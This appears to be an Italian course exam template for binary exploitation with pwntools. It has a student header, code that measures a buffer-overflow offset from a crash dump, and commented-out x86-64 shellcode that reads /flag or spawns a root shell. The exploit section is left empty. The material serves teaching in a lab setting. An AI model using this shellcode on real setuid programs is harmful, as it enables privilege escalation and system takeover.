#!/usr/bin/python3
from pwn import *

# Nome: Mario
# Cognome: Rossi
# Matricola: 1234567890
# Appello del xx/yy/2024
# Breve spiegazione della soluzione persentata:
#
#
#
#
#
#
#
#
#
#
# Si richiede che il codice sia il piu' leggibile e comprensibile possibile,
# eventualmente anche aggiungendo commenti nelle sezioni meno chiare.
# La soluzione deve essere coerente con la tipologia di esercizio (e.g. un esercizio di ROP DEVE(!) essere risolto con tecniche ROP)


# INITIALIZATION
FILENAME = '/challenge/' #TODO aggiungere nome del binario
context.arch = 'amd64' # Setting the correct architecture
context.log_level = 'CRITICAL' # Change this line to 'DEBUG' for a more detailed output

elf = ELF(FILENAME)

# Calculating buffer length with cyclic strings and corefile dump
pattern_size=512
io = elf.process(setuid=False)
io.sendline(f"{pattern_size}".encode())
io.sendline(cyclic(pattern_size,n=8))
io.wait()
buff_len = int(cyclic_find(io.corefile.fault_addr,n=8))
io.close()
# Assuming i want to retrieve the string "test" from the binary:
# string_addr = next(elf.search(b'test\x00'))
# funct_addr = elf.symbols.function_name
# shellcode = asm(shellcraft.cat('/flag'))
# Shellcode alternativo per cat /flag
# shellcode=b"\x48\x31\xFF\x6A\x69\x58\x0F\x05\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x99\x50\x54\x5F\x52\x66\x68\x2D\x63\x54\x5E\x52\xE8\x0A\x00\x00\x00\x63\x61\x74\x20\x2F\x66\x6C\x61\x67\x00\x56\x57\x54\x5E\x6A\x3B\x58\x0F\x05"
# Shellcode per /bin/sh con permessi di root (richiede il passaggio ad interactive())
# shellcode =b"\x48\x31\xFF\x6A\x69\x58\x0F\x05\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x99\x50\x54\x5F\x52\x5E\x6A\x3B\x58\x0F\x05"

#EXPLOIT GOES HERE
